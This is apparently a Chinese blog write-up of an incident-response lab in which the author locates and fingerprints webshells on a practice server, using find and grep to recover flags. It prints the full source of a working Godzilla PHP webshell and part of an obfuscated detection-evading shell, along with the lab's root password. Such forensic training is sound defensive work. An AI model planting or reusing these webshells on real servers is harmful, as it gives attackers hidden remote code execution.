---
title: 玄机 第一章 应急响应 Webshell查杀
description: 玄机 第一章 应急响应 Webshell查杀 WP
pubDate: 10 15 2024
image: https://img.trtyr.top/images/blog/%E7%8E%84%E6%9C%BA%20%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/001%20%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-4.webp
categories:
  - 网络安全
tags:
  - 靶场
  - 应急响应
  - 玄机靶场
---

## 靶场环境

环境：69.230.239.23 / 10.0.10.3

靶机账号密码 root xjwebshell

- 黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}
- 黑客使用的什么工具的shell github地址的md5 flag{md5}
- 黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx
- 黑客免杀马完整路径 md5 flag{md5}

## WP

来到网站根目录，得到 `shell.php`

![](https://img.trtyr.top/images/blog/%E7%8E%84%E6%9C%BA%20%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/001%20%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-1.webp)

没有 flag，find 命令寻找

```shell
find . -name "*.php"
```

寻找后得到 webshell 文件为 `./include/gz.php`，拿到 flag

![](https://img.trtyr.top/images/blog/%E7%8E%84%E6%9C%BA%20%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/001%20%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-2.webp)

观察特征

```
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
//027ccd04-5065-48b6-a32d-77c704a5e26d
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
                eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

开头的

```php
@session_start();
@set_time_limit(0);
@error_reporting(0);
```

明显是哥斯拉的，github 地址为 `https://github.com/BeichenDream/Godzilla`，加密 MD5 得到 `39392DE3218C333F794BEFEF07AC9257`，得到 flag

第三个 flag 是隐藏的 shell，挨个找呗，发现 `.Mysqli.php` 是加密的。

![](https://img.trtyr.top/images/blog/%E7%8E%84%E6%9C%BA%20%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/001%20%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-3.webp)

对路径 `/var/www/html/include/Db/.Mysqli.php` MD5 加密得到 `AEBAC0E58CD6C5FAD1695EE4D1AC1919`

然后是找免杀马，文件太多了，因为是哥斯拉的木马，所以免杀文件里很有可能还有 key 字样，我们找目录下所有文件内容带 key 的 php 文件

```shell
grep -r "key" --include "*.php" /var/www/html
```

得到了一堆 php 文件，然后就挨个看吧

![](https://img.trtyr.top/images/blog/%E7%8E%84%E6%9C%BA%20%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/001%20%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-4.webp)

发现一个特殊文件

```php
<?php

$key = "password";

//ERsDHgEUC1hI
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
```

MD5加密路径得到 flag `EEFF2EABFD9B7A6D26FC1A53D3F7D1DE`
